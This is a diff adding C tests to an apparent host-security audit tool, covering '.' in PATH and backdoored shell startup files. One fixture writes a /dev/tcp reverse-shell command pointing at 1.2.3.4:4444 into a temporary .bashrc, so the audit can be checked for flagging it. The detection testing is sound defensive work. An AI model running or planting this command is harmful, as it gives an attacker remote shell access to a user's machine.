@@ -9,6 +9,7 @@
 #define _POSIX_C_SOURCE 200809L
 
 #include <stdio.h>
+#include <stdlib.h>
 #include <string.h>
 #include <sys/stat.h>
 #include <unistd.h>
@@ -256,6 +257,68 @@ static void test_audit_cron(void) {
     else FAIL("invalid score");
 }
 
+static void test_audit_path_dot(void) {
+    char saved[4096];
+    const char *orig = getenv("PATH");
+    snprintf(saved, sizeof(saved), "%s", orig ? orig : "");
+    setenv("PATH", "/usr/bin:.", 1);
+    AuditVerdict v = hlse_audit_path();
+    setenv("PATH", saved, 1);
+    TEST("Audit A5: '.' in PATH → flagged");
+    if (v.score > 0) PASS(); else FAIL("'.' in PATH not flagged");
+}
+
+static void test_audit_path_clean(void) {
+    char saved[4096];
+    const char *orig = getenv("PATH");
+    snprintf(saved, sizeof(saved), "%s", orig ? orig : "");
+    setenv("PATH", "/usr/bin:/bin", 1);
+    AuditVerdict v = hlse_audit_path();
+    setenv("PATH", saved, 1);
+    TEST("Audit A5: clean PATH → score 0");
+    if (v.score == 0) PASS();
+    else { char b[64]; snprintf(b,64,"score=%d",v.score); FAIL(b); }
+}
+
+static void test_audit_shellrc_backdoor(void) {
+    char saved[512], rcpath[512];
+    const char *orig;
+    const char *rc = "export EDITOR=vim\n"
+                     "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1\n";
+    setup();
+    create(".bashrc", rc, strlen(rc));
+    orig = getenv("HOME");
+    snprintf(saved, sizeof(saved), "%s", orig ? orig : "");
+    setenv("HOME", tmpdir, 1);
+    AuditVerdict v = hlse_audit_shellrc();
+    setenv("HOME", saved, 1);
+    TEST("Audit A6: /dev/tcp reverse shell in .bashrc → flagged");
+    if (v.score >= 40) PASS();
+    else { char b[64]; snprintf(b,64,"score=%d",v.score); FAIL(b); }
+    snprintf(rcpath, sizeof(rcpath), "%s/.bashrc", tmpdir); /* cleanup skips dotfiles */
+    unlink(rcpath);
+    cleanup();
+}
+
+static void test_audit_shellrc_clean(void) {
+    char saved[512], rcpath[512];
+    const char *orig;
+    const char *rc = "export EDITOR=vim\nalias ll='ls -la'\n";
+    setup();
+    create(".bashrc", rc, strlen(rc));
+    orig = getenv("HOME");
+    snprintf(saved, sizeof(saved), "%s", orig ? orig : "");
+    setenv("HOME", tmpdir, 1);
+    AuditVerdict v = hlse_audit_shellrc();
+    setenv("HOME", saved, 1);
+    TEST("Audit A6: benign .bashrc → score 0 (no FP)");
+    if (v.score == 0) PASS();
+    else { char b[64]; snprintf(b,64,"score=%d",v.score); FAIL(b); }
+    snprintf(rcpath, sizeof(rcpath), "%s/.bashrc", tmpdir);
+    unlink(rcpath);
+    cleanup();
+}
+
 static void test_audit_all(void) {
     TEST("Audit: combined audit completes without crash");
     AuditVerdict v = hlse_audit_all();
@@ -305,6 +368,10 @@ int main(void) {
     test_audit_permissions();
     test_audit_dns();
     test_audit_cron();
+    test_audit_path_dot();
+    test_audit_path_clean();
+    test_audit_shellrc_backdoor();
+    test_audit_shellrc_clean();
     test_audit_all();
     test_audit_hardening_index();
 
